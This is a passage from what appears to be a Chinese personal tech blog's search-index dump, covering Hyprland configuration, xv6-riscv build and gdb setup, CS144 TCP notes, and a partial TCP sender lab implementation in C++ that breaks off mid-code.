有些窗口我并不希望是全屏显示，所以我额外设置它们的 size。 对于环境变量，我只是额外设定了 fcitx5 的环境变量。 env = LIBVA_DRIVER_NAME, nvidia env = NVD_BACKEND, direct env = QT_QPA_PLATFORM, wayland env = QT_QPA_PLATFORMTHEME, qt6ct env = XDG_CURRENT_DESKTOP, Hyprland env = XDG_SESSION_TYPE, wayland env = XDG_SESSION_DESKTOP, Hyprland env = EDITOR, /usr/bin/nvim env = LANG,zh_CN.UTF-8 env = QT_IM_MODULE, fcitx env = XMODIFIERS, @im=fcitx env = SDL_IM_MODULE, fcitx env = INPUT_METHOD, fcitx env = GLFW_IM_MODULE, ibus LIBVA_DRIVER_NAME 是配合 nvidia-vaapi-driver 用的。LANG 是当前系统的语言，我通过这个设置系统语言为中文，但是我在 .bashrc 文件重新设置回英文了。 对于自动启动的应用，只需要这么写: exec-once = /usr/bin/wlsunset -t 2500 -T 3000 exec-once = /usr/bin/mako exec-once = /usr/bin/fcitx5 -d exec-once = /usr/bin/blueman-applet exec-once = /usr/bin/swaybg -i \"/home/zuos/Pictures/magic_planet.png\" -m fill exec-once = /usr/bin/waybar -c /home/zuos/.config/waybar/waybar.json exec-once = /usr/bin/hyprctl setcursor \"Tela\" 24 exec-once = /usr/bin/gsettings set org.gnome.desktop.interface icon-theme 'Papirus' exec-once = /usr/bin/gsettings set org.gnome.desktop.interface font-name 'Noto Sans Mono CJK SC 12' wlsunset 是一个设置屏幕色温的软件，我需要一个支持设置 night light 的软件，所以我选择了这位。 mako 是一个通知组件，blueman 是一个蓝牙连接相关的 GUI 软件，blueman-applet 可以启动它的系统托盘。 swaybg 用于设置壁纸，Hyprlan 存在一个 hyprpaper 设置壁纸的软件，但是其功能我不是很需要。 hyprctl 是随安装 Hyprland 就带的，可以获取当前桌面窗口类等信息，并且可以设置鼠标主题和大小，我这里就是干这个用的。 后面两个 gsettings 就是设置图标主题和字体主题。 ","date":"2024-09-13","objectID":"/posts/hyprland_tour/:1:0","tags":["Linux","Intro"],"title":"使用 Hyprland","uri":"/posts/hyprland_tour/"},{"categories":["Linux_杂谈"],"content":"需要额外用到的软件 可以参考 Hyprland wiki。 类似 waybar, wofi, mako, hyprlock 这些的配置文件，可以参考我的 dotfiles: https://github.com/suoyuan666/dotfiles ","date":"2024-09-13","objectID":"/posts/hyprland_tour/:2:0","tags":["Linux","Intro"],"title":"使用 Hyprland","uri":"/posts/hyprland_tour/"},{"categories":["Linux_杂谈"],"content":"tricks 剪切板管理器可能不是谁都能用到，但是 wl-clpboadr 是值得装的，毕竟 neovim 就认那几个剪切板工具。 设置系统为中文后，很有可能部分软件直接把下载路径直接设置为 $HOME/下载，但这还对我来说很难受，可以安装 xdg-user-dirs，之后在LANG=en_US.UTF-8 的环境下执行一编 xdg-user-dirs-update。 XWayland 的分数缩放还是很难搞，不过 Hyprland 可以直接将 XWayland 的缩放设置为 0，如果和我一样，是一个 electron 应用跑在 XWayland 下的话，可以选择附加 --force-device-scale-factor=1.6，这样就可以设置一个正常的缩放了。 没有默认安装一个可以设置打开方式的 GUI 软件，可以使用类似 xdg-settings get default-web-browser 的方式设置。 ","date":"2024-09-13","objectID":"/posts/hyprland_tour/:3:0","tags":["Linux","Intro"],"title":"使用 Hyprland","uri":"/posts/hyprland_tour/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，这是前言，不包括实际代码部分","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"xv6-riscv 源码阅读 —— 前言 2025-01-15 更新 我在 Gentoo Linux 上使用 crossdev 的 -s1 没有成功编译 gcc，不过 -s2 倒是成功了。 2025-01-22 更新 添加了计划部分，以后完成一部分就划一下 2025-01-25 更新 修改了文章中的一些前后矛盾的错误 初步完成了内核虚拟化的部分 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"背景 作为我第一个接触到的操作系统内核项目（虽然我一直使用 Gentoo Linux，但 linux kernel 的代码我又没看过），我对 xv6-riscv 还是有很多兴趣的，本身我对这些系统软件就还算感兴趣。所以有了这个系列，希望可以完整的写完，并且尽量做到适合新手。 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:1:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"xv6-riscv xv6-riscv 是一个基于 RISC-V 架构的教学操作系统内核。xv6 是一个简化版的 Unix v6 操作系统，原本基于 x86 架构，xv6-riscv 则是将其移植到 RISC-V 架构上。 xv6-riscv 包含以下部分: 内核态 进程管理：实现了基本的进程调度、创建、终止和上下文切换 同步机制：提供了锁（spinlock）来实现进程同步 系统调用：提供了用户程序可以调用的系统接口，如文件操作、进程管理、内存管理等 中断和异常处理：包括 RISC-V 特有的异常和中断机制，处理外部设备中断、软件中断等 内存管理：实现了简单的虚拟内存管理和分页机制 文件系统：包括一个简单的文件系统，支持文件的创建、读取、写入和删除等基本操作 设备驱动：驱动了一些基本的硬件设备，如控制台输出（串口）、磁盘、定时器等 客户态 libc：实现了一个简单的 libc，包含常见的库函数 用户程序：包含一些简单的用户程序，用于测试内核功能，如 init、sh、ls、cat 等 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:1:1","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"计划 先将用户态的部分读完 coreutils libc sh 再读 mkfs 最后把内核态的部分读完 先导 并发 虚拟化 持久化 其他 内核态的部分我准备就像 OSTEP 那样主要分三部分来看，也就是这里的并发，虚拟化和持久化 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:2:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"开发环境搭建 对于 Debian/Ubuntu 或 Arch Linux 或 WSL 可以参考官方网站的命令安装相关软件。如果是 Gentoo Linux 的话，则是使用 crossdev 安装 RISC-V 架构的编译工具。 $ sudo emerge --ask sys-devel/Crossdev $ sudo eselect repository create crossdev $ sudo crossdev -s2 --target riscv64-unknown-linux-gnu --ex-gdb 这里的 -s2 是选择安装的级别，根据 crossdev --help: Stage Options: -s0, --stage0 Build just binutils -s1, --stage1 Also build a bare C compiler (no C library/ C++/shared GCC libs/C++ exceptions/etc...) -s2, --stage2 Also build kernel headers -s3, --stage3 Also build the C library -s4, --stage4 Also build a full compiler [default] (shared libs GCC/various lang frontends/etc...) 这个项目不需要 C library 什么的，毕竟是跑在一个 freestanding 环境上的。 默认 qemu 安装没有 RISC-V 64 的支持，需要另开 USE 变量，我给 qemu 开了这些 USE 变量: app-emulation/qemu virgl virtfs usbredir spice usbredirspice qemu_softmmu_targets_x86_64 qemu_softmmu_targets_riscv64 这里有些 USE 变量对于 xv6-riscv 没那么必要，我是因为本身日常有虚拟机的需求，所以才会开这些。 重新编译一编就可以模拟 RISC-V 64 架构了。 如果你是 Fedora Linux，那么可以输入下面的命令安装相关工具: $ sudo dnf install qemu-system-riscv gcc-riscv64-linux-gnu ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:3:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"其他 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:4:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"编译 xv6-riscv 使用下面的命令下载和编译项目: $ git clone https://github.com/mit-pdos/xv6-riscv.git $ cd xv6-riscv $ make qemu 等一段时间就可以发现进入了一个 shell 环境: $ make qemu qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -global virtio-mmio.force-legacy=false -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 xv6 kernel is booting hart 2 starting hart 1 starting init: starting sh $ 我这里是已经跑过编译了，所以会直接起 qemu。 输入 Ctrl + a 之后再输入 x 就可以退出 qemu，如果输入的是 c 而不是 x 则是进入 qemu 的 monitor 模式。 可以使用 make qemu-gdb 开启一个用于给 gdb 调试的端口，之后新开一个终端并进入这个目录执行 riscv64-unknown-linux-gnu-gdb（可能你的发行版的 RISC-V 64 架构的 gdb 不叫这个名字）就可以开始调试了，不过可能一开始提示这个目录的 .gdbinit 脚本不能执行，你需要在 .config/gdb 下信任这个脚本。 如果是刚开始，应该还需要执行 make .gdbinit 生成一下这个脚本，后续就不需要了 这个脚本内容很简单 set confirm off set architecture riscv:rv64 target remote 127.0.0.1:26000 symbol-file kernel/kernel set disassemble-next-line auto set riscv use-compressed-breakpoints yes 就是做了一些简单初始化的工作，让你可以上来就可以开始调试 kernel。 执行 make clean 可以清理掉编译产生的文件，只留下那些源文件。 我使用的是 neovim，所以需要用 clangd 提供更多有关 C 语言的支持。 clangd 需要 compile_commands.json 文件解析项目的依赖关系，所以需要安装 bear，之后执行 bear -- make 重新跑一遍编译，让 bear 产生这个文件，从而让 clangd 解析。 如果你使用的是 Visual Studio Code，我更推荐安装 C/C++ 插件，因为需要用到 gdb 调试。 ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:4:1","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"make 介绍 GNU Make is a tool which controls the generation of executables and other non-source files of a program from the program’s source files. GNU Make 是一个控制从程序源文件生成可执行文件和其他非源文件的工具。 这需要一个 Makefile 去声明项目的构建 以 xv6-riscv 的 Makefile 为例 K=kernel U=user 这就是在定义变量，后续可以使用 $(K) 这样的形式来使用这个变量。 $K/kernel: $(OBJS) $K/kernel.ld $U/initcode $(LD) $(LDFLAGS) -T $K/kernel.ld -o $K/kernel $(OBJS) $(OBJDUMP) -S $K/kernel \u003e $K/kernel.asm $(OBJDUMP) -t $K/kernel | sed '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $K/kernel.sym 这里描述了 $K/kernel 这个目标的编译过程以及依赖关系。: 后面的就是以来关系，需要等这些文件或者是这些目标以及完成后才能开始该目标的构建。而下面缩进四个空格的则是具体的构建时候的命令了。 为什么启动虚拟机是输入 make qemu，调试的时候是用 make qemu-gdb，就是因为这是 Makefile 写好的。 qemu: $K/kernel fs.img $(QEMU) $(QEMUOPTS) .gdbinit: .gdbinit.tmpl-riscv sed \"s/:1234/:$(GDBPORT)/\" \u003c $^ \u003e $@ qemu-gdb: $K/kernel .gdbinit fs.img @echo \"*** Now run 'gdb' in another window.\" 1\u003e\u00262 $(QEMU) $(QEMUOPTS) -S $(QEMUGDB) ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:4:2","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["源码阅读"],"content":"gdb 介绍 GDB, the GNU Project debugger, allows you to see what is going on `inside’ another program while it executes – or what another program was doing at the moment it crashed. GDB，GNU Project 调试器，允许您查看另一个程序在执行时的“内部”发生了什么，或者另一个程序在崩溃的时候正在做什么。 总的来说，gdb 是一个命令行版本的调试器，和大家编程学习中使用的调试器没什么两样。图形化的工具大多是 F5 开始调试，F7/F8 还是 F10/F11 用于步进和跳进之类的。命令行的工具把这些都用指令代替，可以更加专业全面的观察程序运行的行为。 上面这段话的后者是在说 core dump，在 Linux 发行版的环境中变成经常会遇到 Segmentation fault，这时候下面可能还会附带依据 core dumped，这就意味着系统已经为这次 crash 生成了一份“核心转储”文件，可以用 gdb 打开这个文件，软件会直接在发生 crash 的指令的地方打开，方便调试。可以使用 coredumpctl 查看生成的核心转储文件。 简单的启动一个软件就是 gdb \u003csoftware\u003e，进入之后，run 是开始运行，breakpoint（可以简写成 b）则是下断点 b main 就是对 main 函数下断点，也可以对行数下断点，只需要 b test.c:xx 就行，xx 就是行数。continue 可以在停止后继续执行，可以简写成 c。 next 是步进，step 则是跳进（实际上我有点忘记了步进和跳进的区别，反正 step 可以调试的时候进到函数里的，next 则是一行一行执行，遇到了函数也不进去，当成一个语句等待执行完毕），可以简写成 n 和 s，并且可以 n x，x 是数字，表示一次执行几句。 list 可以查看原始 C 代码（当然，前提是附加 -g 选项编译的，xv6-riscv 默认附加了这个编译选项）。layout src 可以启动一个 TUI 界面，让界面展示原始 C 代码，layout asm 则是展示汇编指令，当然还有寄存器窗口。 这种时候，上下左右建都会聚焦在上面的源代码窗口，如果需要使用上下键找历史命令，需要输入 focus cmd 重新聚焦到命令行这部分。 print 可以打印变量的值，也可以做一些简单的数学计算，可以用 p 简写，p/x 表示用十六进制表示，p/s 当然就是字符串表示，更多的可以看文档，print 可以对 C 语言表达式的求值，意思是如果存在一个指针 ptr，可以 p ptr 打印这个指针的值，也可以直接 p *ptr 对这个指针解引用，可以 p \u0026ptr 看这个指针的地址，或者对它做类型转换，都可以。x 可以查看内存分布，x/20 则是看这个 [地址，地址+20] 范围的地址，当然这个也可以选择表示方式，并且也支持对 C 语言表达式的求值。 backtrace 可以把运行到现在函数调用的调用链打印出来，可以简写成 bt。 gdb 支持项目存在一个 .gdbinit 文件，gdb 启动的时候会先执行它。gdb 可以很好的和 Python 集成，所以也存在很多用 Python 写的 gdb 插件，比如 gef。 可以再看看 GDB Cheat Sheet，里面列出了些常用的指令。 更多的可以参考 GDB 的文档: https://sourceware.org/gdb/current/onlinedocs/gdb.html/ ","date":"2024-09-01","objectID":"/posts/xv6_riscv_read_intro/:4:3","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 前言","uri":"/posts/xv6_riscv_read_intro/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记","date":"2024-08-12","objectID":"/posts/cs144_notes_004/","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记 TCP 的错误检测 \u0026 流量控制 \u0026 状态转换 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:0:0","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"错误检测 通常使用三种检测手段：校验和，循环冗余码CRC和消息认证码。例如，Ethernet 附加循环冗余码，TLS 附加消息认证，IP 附加校验和 校验和 计算快速，由软件做校验和运算也不会有太大的消耗 并不可靠，如果两个错误的码相互抵消，比如一个位错误地加 2，另一个位错误地减 2，校验和就捕获不到这个错误。 CRC 很多链路层会使用，计算代价更加大 比校验和更可靠 一般来说，链路层使用了 CRC，TCP/IP 甚至可以不使用校验和，n 位的 CRC 可以检测任何小于等于 n 位长度的错误。 消息验证码 (message authentication code，MAC) 就是消息摘要算法 TLS 使用 很可靠，但不容易排错 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:1:0","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"校验和 IP，TCP，UDP 都使用补码校验和，一些较老一些的计算机使用的是二进制算数版本。 将校验和字段设为 0，后取数据包的 16 bit 相加，0x8000 + 0x8000 = 0x0001。最后取反，如果结果为 0xffff，那就不取反，直接用 0xffff。0 表示没有校验和。 校验的时候是将校验和和数据都再加一次，看看是不是 0xffff。 早期 Internet 通过软件实现校验和 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:1:1","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"CRC 如果是 n 为的数据，需要以某种方式分成 c 为错误检测数据，c 比 n 小得多。 如果有 1500 字节的 Ethernet 就携带 4 字节 32 bit CRC，USB 和蓝牙使用 16 bit。 CRC 无法检测所有错误，有 $2^{-c}$ 几率无法检测到。例如对于 8 bit的 CRC 而言，两个不同的数据的 CRC 相同的概率就是 $\\frac{1}{256}$，即 0.4%。 对于一个多项式 M，其每一位都是 1 的系数，即 M = 1001 = x^4 + 1。 当计算 CRC 时，需要使用 CRC 算法定义的生成多项式 G。例如 CRC-16 算法的生成多项式 0x8005 = x^16 + x^15 + x^2 + 1。由于历史原因，生成多项式的比其位数长一位（其第一项始终为 1）。 计算 CRC：获许消息 M，用 CRC 长度的 0 填充它，将这个值和 G 相除，其余数就是 CRC。将 CRC 附加到消息上，得到 M’ = M + CRC。如果 M’ 和 G 的余数是 0，则通过测试。 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:1:2","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"MAC 不同长度的输入，产生固定长度的输出 散列后的密文不可逆 散列后的结果唯一（不太严谨） 哈希碰撞 一般用于检验数据完整性（签名sign） 消息摘要算法也叫单向散列函数、哈希函数 MAC 和其他消息摘要算法（如 MD5，SHA256 等）不同的是多了一个密钥。 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:1:3","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"流量控制 流量控制要解决通信双方处理数据包的速度不一致的问题。最简单的就是 stop and wait，但现在都会选择 sliding window。 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:2:0","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"stop and wait 就是发送方发一个就等待这个包的 ack，超时了就重发。 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:2:1","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"sliding window sliding window 就是维护一个 window，window size 就是一次性能发送或接收的数据包的数量。 并且可以只发一个 ack 包确认发送的所有数据包。 超时重发有两种选择: window 里的包全部重发 只重发第一个 如果接收方的 window size 为 1 的话，就需要全部重发，因为接收方没有缓存。一般发送的量不多的时候会选择全部重发的策略。 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:2:2","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"TCP header window 告诉对方自己的 window size Flags U 表明该数据应该优先被处理 P 表明应该立即将已接收的数据传递给应用程序，而不是等待缓冲区填满 A,R,S,F ack, reset, syn, fin offset tcp header 的长度 padding 帮助 header 对齐 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:3:0","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课笔记"],"content":"TCP 状态图 图片来自 https://en.wikipedia.org/wiki/File:Tcp_state_diagram_fixed.svg 蓝色的线表示服务器，红色的是客户端。 服务器打开就进入 LISTEN 状态，关闭就回到 CLOSED 状态 客户端先发送 SYN 进入 SYN SENT 状态，服务器收到后发送 SYN ACK 进入 SYN RECEIVED 状态。 客户端收到了 SYN ACK 再发送 ACK 并进入 ESTABLISHED 状态，服务器收到了 ACK 包后也会进入这个状态，自此双方建立连接。 但同时还有一种路径，就是虚线那条，服务器 LISENSE 状态可以主动发 SYN 包，客户端处于 SYN SENT 状态收到后再向服务器发送一个 SYN ACK 包，这样是双方都发送了 SYN，并收到了对方的 ACK。 下面的就是关于连接的关闭，服务器收到 FIN 之后回一个 ACK，服务器这里需要把数据发送完后 close，之后再发送 FIN。 客户端这里 close 之后就发送一个 FIN，并且再收到 FIN-ACK 或者 FIN 的时候就开始清理资源准备 close，如果只收到了 ACK，表示对方数据还没发送完，则继续等待 ","date":"2024-08-12","objectID":"/posts/cs144_notes_004/:4:0","tags":["CS144_notes"],"title":"TCP 的错误检测 \u0026 流量控制 \u0026 状态转换","uri":"/posts/cs144_notes_004/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 3: the TCP sender","date":"2024-08-12","objectID":"/posts/cs144_lab3/","tags":["CS144_lab"],"title":"CS144-2024-lab_3: the TCP sender","uri":"/posts/cs144_lab3/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 3: the TCP sende CS144-2024-lab_3: the TCP sender This week, you’ll implement the “sender” part of TCP, responsible for reading from a ByteStream (created and written to by some sender-side application), and turning the stream into a sequence of outgoing TCP segments. On the remote side, a TCP receiver transforms those segments (those that arrive—they might not all make it) back into the original byte stream, and sends acknowledgments and window advertisements back to the sender. 本周，您将实现 TCP 的 sender 部分，负责从字节流（由某个 sender 应用程序创建和写入）中读取数据，并将该流转换为一系列传出的 TCP 段。在远程端，TCP receiver 将这些段（到达的段 — 它们可能不会全部到达）转换回原始字节流，并将 ack 和 window 发送回 sender。 它说了一长串要求，大致翻译过来是这样: 跟踪 receiver 的 window （接收传入的 TCPReceiverMessage 及其 ackno 和 window size） 从 ByteStream 读取数据，创建新的 TCPSenderMessage（如果需要，包括 SYN 和 FIN 标志）并发送它们。 sender 应继续发送段，直到 window 已满或 ByteStream 没有更多内容可发送。 跟踪哪些段已发送但尚未被 receiver 确认——我们称这些段为“未完成”( outstanding )段 如果已发送了足够长的时间，但尚未得到确认，则重新发送未完成的段 每隔几毫秒，TCPSender 的 tick() 方法就会被调用，并带有一个参数，该参数告诉它自上次调用该方法以来已经过去了多少毫秒。使用它来跟踪 TCPSender 已存活的总毫秒数。请不要尝试从操作系统或 CPU 调用任何有关时间的函数—— tick() 是您了解时间流逝的唯一途径。这可以使事情保持确定性和可测试性。 构造 TCPSender 时，会为其提供一个参数，告知其重传超时 (RTO) 的初始值。RTO 是重新发送未完成的 TCP 段之前要等待的毫秒数。RTO 的值会随时间而变化，但初始值保持不变。起始代码将 RTO 的初始值保存在名为 initial_RTO_ms 的成员变量中。 您将实现 retransmission timer：可以在特定时间启动的警报，一旦 RTO 过去，警报就会响起。强调，这种时间流逝的概念来自于调用的 tick() 方法，而不是通过获取实际的时间。 每次发送包含数据的段（序列空间中的长度非零）时（无论是第一次还是重新传输），如果计时器未运行，则启动它，以便它在 RTO 毫秒后过期（对于 RTO 的当前值）。 当所有未完成的数据都得到确认后，停止 retransmission timer。 重新传输 TCP receiver 尚未完全确认的最早（序列号最低）段。您需要将未完成的段存储在某个内部数据结构中，以便执行此操作。 如果当前 window size 非零 增加连续重传的次数，因为你刚刚重传了一些东西。你的 TCPConnection 将使用此信息来决定连接是否无望（连续重传次数过多）并需要中止 将 RTO 的值加倍。这被称为“指数退避” (exponential backoff)——它会减慢糟糕网络上的重传速度，以避免进一步阻碍工作。 重置 retransmission timer ，设置为 RTO 毫秒后过期（考虑到可能刚刚将 RTO 的值加倍）。 当 receiver 向 sender 发出确认成功收到新数据的确认消息时（确认消息所反映的绝对序列号比任何先前的确认消息都大） 将 RTO 重新设置为其初始值。 如果 sender 有任何未完成的数据，则重新启动重传计时器，以便它在 RTO 毫秒后过期（对于 RTO 的当前值）。 将连续重传次数重置为零。 对于 push(): 要求 TCPSender 从出站字节流中填充 window ：它从流中读取并发送尽可能多的 TCPSenderMessage，注意 window 中要有可用空间。它通过调用提供的 transmit() 函数来发送它们。 您需要确保您发送的每个 TCPSenderMessage 都完全适合 receiver 的 window 。使每条单独的消息尽可能大，但不要大于TCPConfig::MAX_PAYLOAD_SIZE。 您可以使用 TCPSenderMessage::sequence_length() 方法来计算一个段占用的序列号总数。请记住，SYN 和 FIN 标志也各自占用一个序列号。 如果 window 大小为零该怎么办？ 如果 receiver 已宣布 window 大小为零，则 push() 应假装 window 大小为 1。 sender 最终可能会发送一个字节，该字节被 receiver 拒绝（并且不确认），但这也可能促使 receiver 发送新的确认段，其中显示其 window 中已打开更多空间。没有这个， sender 永远不会知道它被允许再次开始发送。这是您的实现在零大小 window 的情况下应该具有的唯一特殊情况行为。TCPSender 实际上不应该记住错误的 window 大小 1。特殊情况仅在 push() 中处理。另外，请注意，即使 window 大小为 1（或 20 或 200）， window 仍可能已满。满 window 与零大小 window 不同。 对于 receive(): receive() 接收一条 TCPReceiverMessage，消息传达了窗口的新左边界 (ackno) 和右边界 (ackno + window size)。 TCPSender 应检查其尚未确认的段集合，并移除所有已完全被确认的段 (即 ackno 大于该段中所有的序列号)。 对于 tick(): 返回自上次调用该方法以来过去的时间。sender 可能需要重新传输 outstanding segment；它可以调用 transmit() 函数来执行此操作。(提醒：请不要尝试在代码中使用现实世界中的有关时间的函数；时间流逝的唯一参考来自 tick() 中传递的自上次调用以来的参数) 对于 make_empty_message(): TCP sender 应该生成并发送一个长度为零的消息，同时正确设置序列号。这在某些情况下很有用，例如对端想要发送一个 TCPReceiverMessage（例如，因为它需要确认来自对端 sender 的某些内容）并且需要生成一个 TCPSenderMessage 与其配对时。 注意：像这样的段不占用任何序列号，因此不需要将其记录为“未确认”，并且不会被重传。 ","date":"2024-08-12","objectID":"/posts/cs144_lab3/:0:0","tags":["CS144_lab"],"title":"CS144-2024-lab_3: the TCP sender","uri":"/posts/cs144_lab3/"},{"categories":["刷课_Lab"],"content":"我的实现 在 tcp_sender.hh 中，给 TCPSender 添加一些成员变量 bool syn_send_ {false}; bool fin_send_ {false}; bool keep_rto_ {false}; uint64_t re_try_count_ {0}; uint64_t past_time_ {0}; uint64_t count_c_ {0}; std::optional\u003cuint64_t\u003e window_size_; std::list\u003cstruct msg_with_time\u003e buffer_; 这里的 struct msg_with_time 是我自己定义的: struct msg_with_time { TCPSenderMessage msg; bool keep_rto; }; msg_with_time 结构体中的 keep_rto 是用来处理 window size 为 0 的特殊情况，它们的 RTO 不应该翻倍，所以多了个 keep_rto_ 和 keep_rto。 下面则是具体的实现: #include \"tcp_sender.hh\" #include \"tcp_config.hh\" #include \"tcp_sender_message.hh\" #include \"wrapping_integers.hh\" #include \u003calgorithm\u003e #include \u003ccstdint\u003e #include \u003cdeque\u003e #include \u003cmemory\u003e #include \u003coptional\u003e #include \u003cranges\u003e using namespace std; uint64_t TCPSender::sequence_numbers_in_flight() const { return count_c_; } uint64_t TCPSender::consecutive_retransmissions() const { return re_try_count_; } void TCPSender::push( const TransmitFunction\u0026 transmit ) { auto has_cap { false }; if ( window_size_.has_value() ) { if ( window_size_.value() == 0 ) { window_size_ = 1; keep_rto_ = true; } if ( window_size_.value() \u003e sequence_numbers_in_flight() ) { has_cap = true; } } else if ( sequence_numbers_in_flight() == 0 ) { has_cap = true; } if ( has_cap \u0026\u0026 ( ( input_.reader().bytes_buffered() \u003e 0 ) || ( input_.reader().bytes_buffered() == 0 \u0026\u0026 ( !syn_send_ || ( input_.writer().is_closed() \u0026\u0026 !fin_send_ ) || input_.reader().has_error() ) ) ) ) { auto limit = std::min( TCPConfig::MAX_PAYLOAD_SIZE, input_.reader().bytes_buffered() ); if ( window_size_.has_value() ) { limit = std::min( limit, window_size_.value() - sequence_numbers_in_flight() ); } const auto fill_enable = limit != 0 \u0026\u0026 window_size_.has_value() \u0026\u0026 window_size_.value() \u003e= TCPConfig::MAX_PAYLOAD_SIZE; for ( auto i = fill_enable ? input_.reader().bytes_buffered() / limit : 0; ( fill_enable ? i \u003e 0 : i == 0 ); --i ) { uint64_t length { 0 }; buffer_.push_back( { { isn_, false, {}, false, input_.reader().has_error() }, keep_rto_ } ); if ( input_.reader().bytes_popped() == 0 \u0026\u0026 !syn_send_ ) { buffer_.back().msg.SYN = true; syn_send_ = true; ++length; ++count_c_; } while ( !input_.reader().has_error() \u0026\u0026 input_.reader().bytes_buffered() \u003e 0 \u0026\u0026 length \u003c limit ) { const auto\u0026 str_t = input_.reader().peek(); buffer_.back().msg.payload += str_t; ++length; ++count_c_; input_.reader().pop( 1 ); } if ( ( window_size_.has_value() ? window_size_.value() \u003e sequence_numbers_in_flight() : limit == 0 ) \u0026\u0026 input_.writer().is_closed() \u0026\u0026 !fin_send_ \u0026\u0026 input_.reader().bytes_buffered() == 0 ) { fin_send_ = true; buffer_.back().msg.FIN = true; ++length; ++count_c_; } isn_ = isn_ + length; transmit( buffer_.back().msg ); if ( keep_rto_ ) { keep_rto_ = false; } } } } TCPSenderMessage TCPSender::make_empty_message() const { return { isn_, false, {}, false, input_.reader().has_error() }; } void TCPSender::receive( const TCPReceiverMessage\u0026 msg ) { if ( msg.RST ) { input_.writer().set_error(); return; } window_size_ = msg.window_size; if ( msg.ackno.has_value() ) { uint64_t length { 0 }; std::deque\u003cstd::shared_ptr\u003cWrap32\u003e\u003e buf_col; for ( auto\u0026 val : std::ranges::reverse_view( buffer_ ) ) { if ( ( val.msg.seqno + length + val.msg.sequence_length() ) == msg.ackno.value() ) { buf_col.push_back( std::make_shared\u003cWrap32\u003e( val.msg.seqno ) ); length += val.msg.sequence_length(); } } if (!buf_col.empty()) { past_time_ = 0; } for (const auto\u0026 val : buf_col) { buffer_.erase(std::find_if(buffer_.begin(), buffer_.end(), [\u0026val](const struct msg_with_time\u0026 arg){ return arg.msg.seqno == *val; })); } count_c_ -= length; } if ( re_try_count_ 